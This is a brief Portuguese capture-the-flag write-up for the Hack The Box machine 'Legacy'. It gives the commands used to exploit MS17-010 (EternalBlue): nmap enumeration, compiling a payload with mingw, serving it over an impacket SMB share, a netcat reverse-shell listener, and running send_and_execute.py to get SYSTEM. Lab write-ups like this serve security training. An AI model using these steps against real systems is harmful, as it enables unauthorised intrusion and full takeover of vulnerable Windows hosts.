Legacy
========================

## Enumeration

    sudo nmap_enum legacy.htb

![qownnotes-media-pLkesf](../../../media/qownnotes-media-pLkesf.png)

## Exploitation

Partindo do principio que ja tenho os exploits prontos para executar na maquina, prosseguiremos com ambiente virtual do python

    cd /home/kali/ownCloud/owncloud/Area_de_trabalho/tools/cves/CVE-2017-0143/MS17-010/impacket
    
    source exploit_ms17-010/bin/activate
    
Pronto, agora eu so preciso preparar o payload para execucao na maquina alvo:

    vi backup.c
    
![qownnotes-media-kTCNcQ](../../../media/qownnotes-media-kTCNcQ.png)

    i686-w64-mingw32-gcc backup.c -o backup_10_10_14_134.exe
    impacket-smbserver smb .

Em um outro terminal eu preparei o netcat para  a shell reversa:

    nc -nlvp 80

Retrocedendo para o primeiro passo da exploracao, agora basta exeutarmos o exploit:

    python send_and_execute.py 10.129.254.79 ../payload/backup_10_10_14_134.exe
  
 ![qownnotes-media-LejsFv](../../../media/qownnotes-media-LejsFv.png)

Como essa vulnerabilidade te coloca na maquina como system, nao e necessario a etapa de escalacao de privilegio.